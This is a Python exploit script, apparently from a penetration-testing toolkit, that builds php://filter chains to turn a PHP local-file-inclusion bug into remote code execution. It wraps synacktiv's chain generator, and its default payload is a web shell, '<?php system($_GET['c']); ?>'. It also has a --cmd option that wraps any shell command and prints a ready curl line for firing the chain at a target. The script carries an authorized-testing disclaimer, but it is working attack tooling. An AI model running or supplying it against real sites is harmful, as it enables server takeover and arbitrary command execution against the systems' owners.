#!/usr/bin/env python3
"""
filter_chain_rce.py — produce a WORKING php://filter chain that makes a PHP *include* sink emit (and
therefore execute) an arbitrary PHP string, with NO file write and NO remote URL (works even with
allow_url_include=Off). The modern go-to LFI->RCE when log/session poisoning and uploads aren't
available (LFI_TESTING_GUIDE.md §12).

Why this is a WRAPPER, not a hand-rolled generator: a byte-correct chain needs a large,
empirically-derived iconv table (loknop's technique). Shipping an incomplete table would silently
emit a BROKEN chain and waste your time on the target — so this drives the proven reference
implementation, synacktiv's php_filter_chain_generator.py. It auto-runs the generator if it is on
PATH / in this folder / in the CWD (or pass --generator <path>), and otherwise prints the exact
one-time setup + command so you are never stuck.

Authorized testing only. Use a BENIGN marker command first, confirm RCE, then STOP and clean up (§21).

Usage:
  python3 filter_chain_rce.py --cmd id
  python3 filter_chain_rce.py --payload "<?php echo 'LFI-POC-7f3a9'; ?>"          # benign proof first
  python3 filter_chain_rce.py --cmd id --generator /opt/php_filter_chain_generator.py
  python3 filter_chain_rce.py --use-synacktiv --payload "<?php system(\$_GET['c']); ?>"  # just print the command
Then:
  curl "https://target/?page=<URL-ENCODED-CHAIN>&c=id"
"""
import argparse, os, shutil, subprocess, sys

GEN_NAME = "php_filter_chain_generator.py"
REPO = "https://github.com/synacktiv/php_filter_chain_generator"


def find_generator(explicit):
    """Locate synacktiv's generator: --generator, then this script's dir, the CWD, then PATH."""
    here = os.path.dirname(os.path.abspath(__file__))
    for c in [explicit, os.path.join(here, GEN_NAME), os.path.join(os.getcwd(), GEN_NAME),
              shutil.which(GEN_NAME)]:
        if c and os.path.isfile(c):
            return c
    return None


def fire_note():
    print("\n# fire it (URL-encode the printed chain into ?page=; the include then EXECUTES your PHP):")
    print('#   curl "https://target/?page=<URL-ENCODED-CHAIN>&c=id"')
    print("# [!] BENIGN marker first (echo a unique token). Confirm RCE, then STOP and clean up (§21).")


def setup_instructions(payload):
    """No generator available (or --use-synacktiv): print the exact one-time setup + command."""
    print("# byte-correct php://filter chains come from synacktiv's generator. One-time setup:")
    print(f"#   git clone {REPO}")
    print(f"#   cp php_filter_chain_generator/{GEN_NAME} .    # into this poc/ dir (or pass --generator <path>)")
    print("# then re-run this script (it auto-detects the generator), or invoke it directly:")
    print(f"python3 {GEN_NAME} --chain {payload!r}")
    fire_note()


def main():
    ap = argparse.ArgumentParser(description="Build a working php://filter chain for LFI->RCE (drives synacktiv's generator).")
    ap.add_argument("--payload", default="<?php system($_GET['c']); ?>",
                    help="the PHP the include should execute (default runs $_GET['c'])")
    ap.add_argument("--cmd", help="shorthand: wraps a shell command as <?php system('CMD'); ?> (e.g. --cmd id)")
    ap.add_argument("--generator", help=f"path to synacktiv {GEN_NAME} (else auto-detected)")
    ap.add_argument("--use-synacktiv", action="store_true",
                    help="don't auto-run; just print the exact synacktiv command to produce the chain")
    a = ap.parse_args()

    payload = f"<?php system('{a.cmd}'); ?>" if a.cmd else a.payload

    if a.use_synacktiv:
        setup_instructions(payload)
        return 0

    gen = find_generator(a.generator)
    if not gen:
        print("# php://filter-chain generator not found locally.")
        setup_instructions(payload)
        return 0

    print(f"# using generator: {gen}")
    try:
        r = subprocess.run([sys.executable, gen, "--chain", payload],
                           capture_output=True, text=True, timeout=60)
    except Exception as e:
        print(f"[!] failed to run the generator ({e}); use the manual command below.", file=sys.stderr)
        setup_instructions(payload)
        return 1
    sys.stdout.write(r.stdout)
    if r.stderr.strip():
        sys.stderr.write(r.stderr)
    if r.returncode != 0:
        print(f"[!] generator exited {r.returncode}; check the payload / your generator version.", file=sys.stderr)
        return 1
    fire_note()
    return 0


if __name__ == "__main__":
    sys.exit(main())
